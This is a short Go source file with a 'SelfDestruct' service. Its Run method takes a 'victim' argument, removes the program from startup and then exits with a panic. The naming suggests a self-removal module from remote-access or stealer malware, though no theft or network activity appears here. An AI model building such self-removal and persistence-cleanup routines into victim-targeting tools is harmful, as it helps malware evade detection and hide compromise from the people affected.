package services

import (
	"fmt"
	"main/utils"
)

type SelfDestruct struct {
}

func (s SelfDestruct) Run(victim string) {
	err := utils.RemoveFromStartup()
	if err != nil {
		utils.HandleError("Error self destructing", victim)
		fmt.Println("Error self destructing")
		return
	}
	panic("Goodbye")
}
